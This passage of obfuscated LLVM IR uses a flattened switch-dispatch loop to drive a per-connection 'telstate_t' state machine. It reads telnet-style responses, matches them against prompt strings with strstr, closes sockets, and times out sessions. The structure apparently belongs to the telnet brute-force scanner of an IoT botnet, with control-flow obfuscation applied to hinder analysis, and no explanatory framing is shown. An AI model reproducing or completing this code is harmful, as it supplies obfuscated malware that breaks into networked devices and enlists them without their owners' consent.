  %838 = load i16, i16* %837, align 16
  %839 = zext i16 %838 to i32
  %840 = call i32 @readUntil(i32 %828, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %833, i32 1024, i32 %839)
  %841 = icmp ne i32 %840, 0
  %842 = select i1 %841, i32 -1373688542, i32 -1403645059
  store i32 %842, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = load i32, i32* %2, align 4
  %845 = sext i32 %844 to i64
  %.reload273 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload273, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 6
  store i32 0, i32* %847, align 4
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %.reload272 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload272, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 7
  store i16 0, i16* %851, align 16
  %852 = load i32, i32* %2, align 4
  %853 = sext i32 %852 to i64
  %.reload271 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload271, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 8
  %856 = load i8*, i8** %855, align 8
  %857 = call i8* @strstr(i8* %856, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %858 = icmp ne i8* %857, null
  %859 = select i1 %858, i32 830618873, i32 624182474
  store i32 %859, i32* %switchVar
  br label %loopEnd

; <label>:860:                                    ; preds = %loopEntry
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %.reload270 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload270, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 2
  store i8 5, i8* %864, align 8
  store i32 -289075552, i32* %switchVar
  br label %loopEnd

; <label>:865:                                    ; preds = %loopEntry
  %866 = load i32, i32* %2, align 4
  %867 = sext i32 %866 to i64
  %.reload269 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload269, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 2
  store i8 7, i8* %869, align 8
  store i32 -289075552, i32* %switchVar
  br label %loopEnd

; <label>:870:                                    ; preds = %loopEntry
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %.reload268 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload268, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 8
  %875 = load i8*, i8** %874, align 8
  call void @llvm.memset.p0i8.i64(i8* %875, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:876:                                    ; preds = %loopEntry
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %.reload267 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload267, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 0
  %881 = load i32, i32* %880, align 16
  %882 = load i32, i32* %2, align 4
  %883 = sext i32 %882 to i64
  %.reload266 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload266, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 8
  %886 = load i8*, i8** %885, align 8
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %.reload265 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload265, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 7
  %891 = load i16, i16* %890, align 16
  %892 = zext i16 %891 to i32
  %893 = call i32 @readUntil(i32 %881, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %886, i32 1024, i32 %892)
  %894 = icmp ne i32 %893, 0
  %895 = select i1 %894, i32 841119050, i32 -901374423
  store i32 %895, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  %897 = load i32, i32* %2, align 4
  %898 = sext i32 %897 to i64
  %.reload264 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload264, i64 %898
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %899, i32 0, i32 6
  store i32 0, i32* %900, align 4
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %.reload263 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload263, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 7
  store i16 0, i16* %904, align 16
  %905 = load i32, i32* %2, align 4
  %906 = sext i32 %905 to i64
  %.reload262 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload262, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 8
  %909 = load i8*, i8** %908, align 8
  %910 = call i8* @strstr(i8* %909, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %911 = icmp ne i8* %910, null
  %912 = select i1 %911, i32 -581405955, i32 1433616656
  store i32 %912, i32* %switchVar
  br label %loopEnd

; <label>:913:                                    ; preds = %loopEntry
  %914 = load i32, i32* %2, align 4
  %915 = sext i32 %914 to i64
  %.reload261 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload261, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 2
  store i8 5, i8* %917, align 8
  store i32 -1791839512, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i32, i32* %2, align 4
  %920 = sext i32 %919 to i64
  %.reload260 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload260, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 2
  store i8 7, i8* %922, align 8
  store i32 -1791839512, i32* %switchVar
  br label %loopEnd

; <label>:923:                                    ; preds = %loopEntry
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %.reload259 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload259, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 8
  %928 = load i8*, i8** %927, align 8
  call void @llvm.memset.p0i8.i64(i8* %928, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  %930 = load i32, i32* %2, align 4
  %931 = sext i32 %930 to i64
  %.reload258 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload258, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 8
  %934 = load i8*, i8** %933, align 8
  %935 = call i8* @strstr(i8* %934, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %936 = icmp ne i8* %935, null
  %937 = select i1 %936, i32 60297510, i32 -1177108902
  store i32 %937, i32* %switchVar
  br label %loopEnd

; <label>:938:                                    ; preds = %loopEntry
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %.reload257 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload257, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %941, i32 0, i32 0
  %943 = load i32, i32* %942, align 16
  %944 = call i32 @sclose(i32 %943)
  %945 = load i32, i32* %2, align 4
  %946 = sext i32 %945 to i64
  %.reload256 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload256, i64 %946
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %947, i32 0, i32 2
  store i8 0, i8* %948, align 8
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %.reload255 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload255, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 3
  store i8 0, i8* %952, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:953:                                    ; preds = %loopEntry
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %.reload254 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload254, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 8
  %958 = load i8*, i8** %957, align 8
  %959 = call i8* @strstr(i8* %958, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %960 = icmp ne i8* %959, null
  %961 = select i1 %960, i32 -897522629, i32 -151608290
  store i32 %961, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  %963 = load i32, i32* %2, align 4
  %964 = sext i32 %963 to i64
  %.reload253 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload253, i64 %964
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %965, i32 0, i32 0
  %967 = load i32, i32* %966, align 16
  %968 = call i32 @sclose(i32 %967)
  %969 = load i32, i32* %2, align 4
  %970 = sext i32 %969 to i64
  %.reload252 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload252, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 2
  store i8 0, i8* %972, align 8
  %973 = load i32, i32* %2, align 4
  %974 = sext i32 %973 to i64
  %.reload251 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload251, i64 %974
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %975, i32 0, i32 3
  store i8 0, i8* %976, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:977:                                    ; preds = %loopEntry
  %978 = load i32, i32* %2, align 4
  %979 = sext i32 %978 to i64
  %.reload250 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload250, i64 %979
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %980, i32 0, i32 8
  %982 = load i8*, i8** %981, align 8
  %983 = call i8* @strstr(i8* %982, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %984 = icmp ne i8* %983, null
  %985 = select i1 %984, i32 -1164754189, i32 266300578
  store i32 %985, i32* %switchVar
  br label %loopEnd

; <label>:986:                                    ; preds = %loopEntry
  %987 = load i32, i32* %2, align 4
  %988 = sext i32 %987 to i64
  %.reload249 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload249, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 0
  %991 = load i32, i32* %990, align 16
  %992 = call i32 @sclose(i32 %991)
  %993 = load i32, i32* %2, align 4
  %994 = sext i32 %993 to i64
  %.reload248 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload248, i64 %994
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %995, i32 0, i32 2
  store i8 0, i8* %996, align 8
  %997 = load i32, i32* %2, align 4
  %998 = sext i32 %997 to i64
  %.reload247 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload247, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 3
  store i8 0, i8* %1000, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1001:                                   ; preds = %loopEntry
  %1002 = load i32, i32* %2, align 4
  %1003 = sext i32 %1002 to i64
  %.reload246 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload246, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 8
  %1006 = load i8*, i8** %1005, align 8
  %1007 = call i8* @strstr(i8* %1006, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1008 = icmp ne i8* %1007, null
  %1009 = select i1 %1008, i32 1443260900, i32 -758752623
  store i32 %1009, i32* %switchVar
  br label %loopEnd

; <label>:1010:                                   ; preds = %loopEntry
  %1011 = load i32, i32* %2, align 4
  %1012 = sext i32 %1011 to i64
  %.reload245 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload245, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 0
  %1015 = load i32, i32* %1014, align 16
  %1016 = call i32 @sclose(i32 %1015)
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %.reload244 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload244, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 2
  store i8 0, i8* %1020, align 8
  %1021 = load i32, i32* %2, align 4
  %1022 = sext i32 %1021 to i64
  %.reload243 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload243, i64 %1022
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1023, i32 0, i32 3
  store i8 0, i8* %1024, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1025:                                   ; preds = %loopEntry
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %.reload242 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload242, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 8
  %1030 = load i8*, i8** %1029, align 8
  %1031 = call i8* @strstr(i8* %1030, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1032 = icmp ne i8* %1031, null
  %1033 = select i1 %1032, i32 -863835605, i32 -794868327
  store i32 %1033, i32* %switchVar
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i32, i32* %2, align 4
  %1036 = sext i32 %1035 to i64
  %.reload241 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload241, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 0
  %1039 = load i32, i32* %1038, align 16
  %1040 = call i32 @sclose(i32 %1039)
  %1041 = load i32, i32* %2, align 4
  %1042 = sext i32 %1041 to i64
  %.reload240 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload240, i64 %1042
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1043, i32 0, i32 2
  store i8 0, i8* %1044, align 8
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %.reload239 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload239, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 3
  store i8 0, i8* %1048, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1049:                                   ; preds = %loopEntry
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %.reload238 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload238, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 8
  %1054 = load i8*, i8** %1053, align 8
  %1055 = call i8* @strstr(i8* %1054, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1056 = icmp ne i8* %1055, null
  %1057 = select i1 %1056, i32 -1651053636, i32 -1953664499
  store i32 %1057, i32* %switchVar
  br label %loopEnd

; <label>:1058:                                   ; preds = %loopEntry
  %1059 = load i32, i32* %2, align 4
  %1060 = sext i32 %1059 to i64
  %.reload237 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload237, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 0
  %1063 = load i32, i32* %1062, align 16
  %1064 = call i32 @sclose(i32 %1063)
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %.reload236 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload236, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 2
  store i8 0, i8* %1068, align 8
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %.reload235 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload235, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 3
  store i8 0, i8* %1072, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1073:                                   ; preds = %loopEntry
  %1074 = load i32, i32* %2, align 4
  %1075 = sext i32 %1074 to i64
  %.reload234 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload234, i64 %1075
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1076, i32 0, i32 8
  %1078 = load i8*, i8** %1077, align 8
  %1079 = call i8* @strstr(i8* %1078, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1080 = icmp ne i8* %1079, null
  %1081 = select i1 %1080, i32 1782193102, i32 -1498728882
  store i32 %1081, i32* %switchVar
  br label %loopEnd

; <label>:1082:                                   ; preds = %loopEntry
  %1083 = load i32, i32* %2, align 4
  %1084 = sext i32 %1083 to i64
  %.reload233 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload233, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 0
  %1087 = load i32, i32* %1086, align 16
  %1088 = call i32 @sclose(i32 %1087)
  %1089 = load i32, i32* %2, align 4
  %1090 = sext i32 %1089 to i64
  %.reload232 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload232, i64 %1090
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1091, i32 0, i32 2
  store i8 0, i8* %1092, align 8
  %1093 = load i32, i32* %2, align 4
  %1094 = sext i32 %1093 to i64
  %.reload231 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload231, i64 %1094
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1095, i32 0, i32 3
  store i8 0, i8* %1096, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1097:                                   ; preds = %loopEntry
  %1098 = load i32, i32* %2, align 4
  %1099 = sext i32 %1098 to i64
  %.reload230 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload230, i64 %1099
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1100, i32 0, i32 8
  %1102 = load i8*, i8** %1101, align 8
  %1103 = call i8* @strstr(i8* %1102, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1104 = icmp ne i8* %1103, null
  %1105 = select i1 %1104, i32 -683271385, i32 -2059789037
  store i32 %1105, i32* %switchVar
  br label %loopEnd

; <label>:1106:                                   ; preds = %loopEntry
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %.reload229 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload229, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 0
  %1111 = load i32, i32* %1110, align 16
  %1112 = call i32 @sclose(i32 %1111)
  %1113 = load i32, i32* %2, align 4
  %1114 = sext i32 %1113 to i64
  %.reload228 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload228, i64 %1114
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1115, i32 0, i32 2
  store i8 0, i8* %1116, align 8
  %1117 = load i32, i32* %2, align 4
  %1118 = sext i32 %1117 to i64
  %.reload227 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload227, i64 %1118
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1119, i32 0, i32 3
  store i8 0, i8* %1120, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1121:                                   ; preds = %loopEntry
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %.reload226 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload226, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 8
  %1126 = load i8*, i8** %1125, align 8
  %1127 = call i8* @strstr(i8* %1126, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1128 = icmp ne i8* %1127, null
  %1129 = select i1 %1128, i32 -613379616, i32 1089912850
  store i32 %1129, i32* %switchVar
  br label %loopEnd

; <label>:1130:                                   ; preds = %loopEntry
  %1131 = load i32, i32* %2, align 4
  %1132 = sext i32 %1131 to i64
  %.reload225 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload225, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 0
  %1135 = load i32, i32* %1134, align 16
  %1136 = call i32 @sclose(i32 %1135)
  %1137 = load i32, i32* %2, align 4
  %1138 = sext i32 %1137 to i64
  %.reload224 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload224, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 2
  store i8 0, i8* %1140, align 8
  %1141 = load i32, i32* %2, align 4
  %1142 = sext i32 %1141 to i64
  %.reload223 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload223, i64 %1142
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1143, i32 0, i32 3
  store i8 0, i8* %1144, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1145:                                   ; preds = %loopEntry
  %1146 = load i32, i32* %2, align 4
  %1147 = sext i32 %1146 to i64
  %.reload222 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload222, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 8
  %1150 = load i8*, i8** %1149, align 8
  %1151 = call i64 @strlen(i8* %1150) #10
  %1152 = trunc i64 %1151 to i16
  %1153 = load i32, i32* %2, align 4
  %1154 = sext i32 %1153 to i64
  %.reload221 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload221, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 7
  store i16 %1152, i16* %1156, align 16
  store i32 884790507, i32* %switchVar
  br label %loopEnd

; <label>:1157:                                   ; preds = %loopEntry
  %1158 = load i32, i32* %2, align 4
  %1159 = sext i32 %1158 to i64
  %.reload220 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload220, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 6
  %1162 = load i32, i32* %1161, align 4
  %1163 = add i32 %1162, 10
  %1164 = zext i32 %1163 to i64
  %1165 = call i64 @time(i64* null) #2
  %1166 = icmp slt i64 %1164, %1165
  %1167 = select i1 %1166, i32 -1075176802, i32 2130108801
  store i32 %1167, i32* %switchVar
  br label %loopEnd

; <label>:1168:                                   ; preds = %loopEntry
  %1169 = load i32, i32* %2, align 4
  %1170 = sext i32 %1169 to i64
  %.reload219 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload219, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1171, i32 0, i32 0
  %1173 = load i32, i32* %1172, align 16
  %1174 = call i32 @sclose(i32 %1173)
  %1175 = load i32, i32* %2, align 4
  %1176 = sext i32 %1175 to i64
  %.reload218 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload218, i64 %1176
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1177, i32 0, i32 2
  store i8 0, i8* %1178, align 8
  %1179 = load i32, i32* %2, align 4
  %1180 = sext i32 %1179 to i64
  %.reload217 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload217, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 3
  store i8 1, i8* %1182, align 1
  store i32 2130108801, i32* %switchVar
  br label %loopEnd

; <label>:1183:                                   ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:1184:                                   ; preds = %loopEntry
  %1185 = load i32, i32* %2, align 4
  %1186 = sext i32 %1185 to i64
  %.reload216 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload216, i64 %1186
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1187, i32 0, i32 0
  %1189 = load i32, i32* %1188, align 16
